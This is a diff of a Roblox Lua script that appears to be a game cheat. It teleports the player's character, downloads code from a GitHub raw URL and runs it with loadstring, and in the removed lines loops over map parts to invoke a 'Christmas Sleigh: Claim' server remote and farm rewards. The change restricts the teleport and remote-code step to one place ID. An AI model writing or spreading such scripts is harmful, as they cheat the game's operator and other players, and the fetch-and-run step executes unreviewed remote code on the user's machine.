@@ -8,22 +8,11 @@ until game.PlaceId ~= nil
 
 repeat
     task.wait(1)
+
 until game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
-task.wait(120)
-game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2615.27588, 16.2414665, -20874.6172)
-task.wait(10)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KqRs/Secretss/refs/heads/main/something",true))()
-task.wait(10)
-spawn(function()
-    while true do
-        for i,v in pairs(workspace:GetChildren()) do
-            if v:IsA("MeshPart") then
-                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Christmas Sleigh: Claim"):InvokeServer(v.Name)
-                task.wait(.5)
-                v:Destroy()
-                task.wait(1)
-            end
-        end
-        task.wait(30)
-    end
-end)
+if game.PlaceId == 17503543197 then
+    task.wait(120)
+    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2615.27588, 16.2414665, -20874.6172)
+    task.wait(10)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KqRs/Secretss/refs/heads/main/something",true))()
+end
